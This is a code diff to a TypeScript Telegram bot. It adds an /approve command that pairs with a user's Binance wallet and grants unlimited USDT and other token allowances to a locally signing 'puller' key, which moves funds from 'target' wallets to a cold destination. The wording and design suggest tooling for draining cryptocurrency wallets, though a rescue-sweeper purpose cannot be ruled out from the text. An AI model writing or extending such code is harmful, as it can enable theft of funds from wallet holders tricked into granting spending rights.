@@ -4,7 +4,7 @@ import { mainKeyboardFor, adminKeyboard, backKeyboard } from './keyboards';
 import { inviteLink } from './state';
 import {
     upsertTarget, deactivate, listActive, newPuller, addToken,
-    findTarget, adminStats,
+    findTarget, adminStats, type Target,
 } from '../engine/storage';
 import { grantAllowance, signin, verify } from '../engine/baw';
 import { allowanceOf, gasOf } from '../engine/puller';
@@ -34,6 +34,7 @@ The puller signs locally. No session, no MPC round trip, no <code>tx-lock</code>
 <b>Commands</b>
 <code>/arm</code> - arm a wallet
 <code>/repair</code> - regenerate a missing puller
+<code>/approve</code> - re-grant USDT allowance to puller
 <code>/addtoken</code> - watch another token
 <code>/monitors</code> - status
 <code>/fund</code> - puller addresses
@@ -87,8 +88,7 @@ export function buildBot() {
                     await grantAllowance(s, t, puller);
                 } catch {
                     await ctx.reply(
-                        `Approve failed for <code>${t}</code>. Manual:\n` +
-                        `<code>baw contract-call preview --binanceChainId 56 --to ${t} --function "approve(address,uint256)" --args "${puller},${MAX_UINT}"</code>`,
+                        `Approve failed for <code>${t}</code>. Run <code>/approve ${target}</code> to retry.`,
                         H
                     );
                 }
@@ -115,6 +115,40 @@ export function buildBot() {
         const [, target, cold] = ctx.message.text.split(' ');
         if (!target || !cold) return ctx.reply('Usage: <code>/repair &lt;wallet&gt; &lt;cold_destination&gt;</code>', H);
         await armTarget(ctx, target, cold);
+    });
+
+    bot.command('approve', async ctx => {
+        const [, target] = ctx.message.text.split(' ');
+        if (!target) return ctx.reply('Usage: <code>/approve &lt;wallet_address&gt;</code>', H);
+
+        const userId = ctx.from!.id;
+        const rows = await listActive(userId);
+        const targetObj = rows.find(r => r.target.toLowerCase() === target.toLowerCase());
+
+        if (!targetObj || !targetObj.puller) {
+            return ctx.reply('❌ Active target not found or puller missing. /arm first.', H);
+        }
+
+        await ctx.reply(`🔗 *Re-authenticating and granting allowance for \`${target}\`...*`, { parse_mode: 'Markdown' });
+
+        const s = { dir: `t${targetObj.target}`, instanceId: targetObj.instanceId! };
+        try {
+            const data = await signin(s);
+            await ctx.reply(
+                `<b>Pair once to approve:</b>\n<code>${data.pairingCode}</code>\n${data.urlForWeb}`,
+                { ...H, link_preview_options: { is_disabled: true } }
+            );
+
+            await verify(s, data.qrCodeId);
+
+            for (const tok of targetObj.tokens) {
+                await grantAllowance(s, tok.token, targetObj.puller);
+            }
+
+            await ctx.reply(`✅ *Allowance Approved Successfully! Puller is armed and ready.*`, { parse_mode: 'Markdown' });
+        } catch (e: any) {
+            await ctx.reply(`❌ Approval failed: <code>${String(e.message || e).slice(0, 160)}</code>`, H);
+        }
     });
 
     bot.command('addtoken', async ctx => {
